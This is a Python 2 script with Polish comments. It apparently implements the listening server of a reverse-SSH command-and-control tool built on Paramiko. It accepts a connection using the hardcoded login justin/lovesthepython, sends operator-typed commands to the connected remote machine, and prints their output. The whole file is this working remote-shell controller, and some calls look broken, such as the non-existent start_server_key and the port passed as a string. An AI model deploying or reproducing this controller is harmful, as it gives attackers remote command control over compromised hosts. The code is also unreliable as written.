#coding=utf-8

import socket
import paramiko
import threading
import sys
#użycie klucza SSH podanego w plikach demonstracyjnych Paramiko
host_key = paramiko.RSAKey(filename="test_key.txt")

class Server (paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
	def check_auth_password(self, username, password):
		if (username == 'justin') and (password == 'lovesthepython'):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = sys.argv[2]
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind((server, ssh_port))
	sock.listen(100)
	print "[+] Nasłuchiwanie połączeń..."
	client, addr = sock.accept()
except Exception, e:
	print "[-] Nasłuch się nie udał: " + str(e)
	sys.exit(1)
print '[+] Jest połączenie !'

try:
	bhSession = paramiko.Transport(client)
	bhSession.add_server_key(host_key)
	server = Server()
	try:
		bhSession.start_server_key(server=server)
	except paramiko.SSHException, x:
		print "[-] Negocjacja SSH nie powiodła się."
	chan = bhSession.accept(20)
	print "[+] Uwierzytelniono !"
	print chan.recv(1024)
	chan.send("Witaj w bh_ssh")
	while True:
		try:
			command = raw_input("Wprowadź polecenie: ").strip('\n')
			if command != 'exit':
				chan.send(command)
				print chan.recv(1024) + '\n'
			else:
				chan.send('exit')
				print 'exiting'
				bhSession.close()
				raise Exception('exit')
		except KeyboardInterrupt:
				bhSession.close()
except Exception, e:
	print "[-] Przechwycono wyjątek: " + str(e)
	try:
		bhSession.close()
	except:
		pass
	sys.exit(1) 

